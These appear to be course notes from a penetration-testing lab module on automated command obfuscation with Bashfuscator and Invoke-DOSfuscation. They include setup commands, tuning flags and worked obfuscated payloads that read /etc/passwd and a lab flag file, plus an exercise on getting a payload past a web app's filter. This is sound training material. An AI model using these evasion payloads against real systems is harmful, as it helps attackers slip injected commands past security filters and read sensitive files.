# Evasion Tools

---

## Overview

- Against advanced security tools, manual obfuscation may not be enough.
- Automated obfuscation tools can generate much stronger evasion payloads.
- Two tools covered: **Bashfuscator** (Linux) and **Invoke-DOSfuscation** (Windows).

---

## Linux — Bashfuscator

### Setup

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```

- Run from `./bashfuscator/bin/`.
- `-h` shows the help menu (list of obfuscators/compressors/encoders via `-l`, command input via `-c`, etc.).

### Basic Usage

```bash
./bashfuscator -c 'cat /etc/passwd'
```

```
[+] Mutators used: Token/ForCode -> Command/Reverse
[+] Payload: ${*/+27\[X\(} ...SNIP... ${*~}
[+] Payload size: 1664 characters
```

- **Default behavior:** randomly picks obfuscation technique(s) → output size can range from a few hundred to **over a million characters**.

### Tuned (Shorter) Usage

```bash
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

```
[+] Mutators used: Token/ForCode
[+] Payload: eval "$(W0=(w \  t e c p s a / d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
[+] Payload size: 104 characters
```

- Flags used: `-s` (size/strength), `-t` (technique), `--no-mangling`, `--layers 1` → produces a much shorter, simpler payload.

### Verify Locally

```bash
bash -c 'eval "$(W0=(w \  t e c p s a / d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
# root:x:0:0:root:/root:/bin/bash
# ...SNIP...
```

- Works correctly and looks nothing like the original `cat /etc/passwd` command.
- Bashfuscator combines multiple techniques, including ones covered earlier (character insertion, reversal, etc.) plus others.

**Exercise:** Test the generated payload against the Host Checker web app. If it fails, figure out why (e.g., it may contain a still-filtered character like a space) and adjust the tool's output to produce a working payload.

## Windows — Invoke-DOSfuscation

- **Interactive** tool (unlike Bashfuscator) — run once, then interact with its menu.

### Setup

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```

- `help` shows the menu. `tutorial` gives a walkthrough example.
- Main options: **BINARY** (obfuscated binary syntax for cmd.exe/powershell.exe), **ENCODING** (environment variable encoding), **PAYLOAD** (obfuscated payload via DOSfuscation).

### Example Workflow

```powershell
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```

**Result:**
```
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```

### Verify in CMD

```cmd
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
# test_flag
```

- Uses the environment-variable substring technique (from Section 7) at scale to rebuild `type C:\Users\htb-student\Desktop\flag.txt` character by character.

**Tip:** No Windows VM? Run via `pwsh` on Linux — same commands work. `pwsh` is installed by default on Pwnbox.

## Key Takeaways

| Tool | Platform | Notes |
|---|---|---|
| **Bashfuscator** | Linux | `-c` to obfuscate; default = random/huge; tune with `-s`, `-t`, `--no-mangling`, `--layers` for shorter payloads |
| **Invoke-DOSfuscation** | Windows | Interactive; `SET COMMAND`, then choose BINARY / ENCODING / PAYLOAD |

- Always **test the obfuscated output** against the target — it may still contain a filtered character (e.g. spaces) that needs further bypassing.
- Further reading on advanced obfuscation: **Secure Coding 101: JavaScript** module.
